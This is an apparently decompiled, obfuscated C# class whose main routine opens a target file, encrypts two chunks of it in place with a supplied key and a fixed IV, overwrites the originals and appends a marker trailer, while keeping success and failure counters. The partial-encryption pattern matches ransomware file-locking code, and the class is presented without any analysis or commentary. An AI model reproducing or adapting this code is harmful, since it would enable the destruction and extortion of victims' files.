using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using tEkZemnspFoCzB;

namespace ovnaSovhORzB;

internal sealed class KEPDVlpbgsoad
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int ZSydxtDAhFEoW(long long_0)
	{
		return (int)long_0;
	}

	public static bool kCRjVccpOKvz(string jHxLOxiqlz, string JpnRukeurwmvARE, string MIozOToTTCuQr, byte[] UROIvSCIgaS = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(jHxLOxiqlz, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = ZSydxtDAhFEoW(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(JpnRukeurwmvARE) * Convert.ToInt32(fileStream.Length) / 100;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = int.MaxValue;
				}
				if (num < num2)
				{
					num2 = num - Convert.ToInt32(JpnRukeurwmvARE) * 1000 * 1000;
				}
				int bDtuYzFUhbUWi = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 2; i++)
				{
					byte[] byte_ = ToyuZfnhjWEUjj(jHxLOxiqlz, fileStream, bDtuYzFUhbUWi, num * i);
					array = (EEGkMyyVIDL.xIEYdRogbJjk ? NVikUgaKetXUZt.GbzVpJVLoYrET(byte_, Encoding.ASCII.GetBytes(MIozOToTTCuQr), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YkOjxnmurVCfbj.WsadWEYMhPkNa(byte_, Encoding.ASCII.GetBytes(MIozOToTTCuQr), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					DjKnHzfRjPDm(jHxLOxiqlz, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (EEGkMyyVIDL.DfXjMyctTQk ? Encoding.ASCII.GetBytes(EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107473226)) + EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107474210)) + Convert.ToString(JpnRukeurwmvARE) + EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107474210))) : Encoding.ASCII.GetBytes(EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107473226)) + EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107474219)) + Convert.ToString(JpnRukeurwmvARE) + EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107474219))));
			if (!EEGkMyyVIDL.DfXjMyctTQk)
			{
				using FileStream fileStream2 = new FileStream(jHxLOxiqlz, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(jHxLOxiqlz, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(UROIvSCIgaS, 0, UROIvSCIgaS.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (EEGkMyyVIDL.qphnWLJhmOUolrV)
			{
				try
				{
					File.AppendAllText(EEGkMyyVIDL.GqXvKuGfqke, getString_0(107461839) + jHxLOxiqlz + getString_0(107473213) + ex.Message + getString_0(107396485));
				}
				catch (Exception)
				{
				}
			}
			EEGkMyyVIDL.CfPnwVRgYaXy++;
			return false;
		}
		EEGkMyyVIDL.eHvSFFSwlBBvD++;
		return true;
	}

	public static byte[] ToyuZfnhjWEUjj(string MtzSXJGYzRLI, FileStream VTfveuBXOwWa, int BDtuYzFUhbUWi, int YCKmFpsjOvHk = 0)
	{
		byte[] array = new byte[BDtuYzFUhbUWi];
		VTfveuBXOwWa.Position = YCKmFpsjOvHk;
		VTfveuBXOwWa.Read(array, 0, BDtuYzFUhbUWi);
		return array;
	}

	public static void DjKnHzfRjPDm(string LAriueHUtmINUEu, FileStream evZRkwbyBxJ, byte[] vaPIETiBNPSglNTU, int OWCoShQijiLH = 0)
	{
		evZRkwbyBxJ.Position = OWCoShQijiLH;
		evZRkwbyBxJ.Write(vaPIETiBNPSglNTU, 0, vaPIETiBNPSglNTU.Length);
	}

	static KEPDVlpbgsoad()
	{
		Strings.CreateGetStringDelegate(typeof(KEPDVlpbgsoad));
	}
}
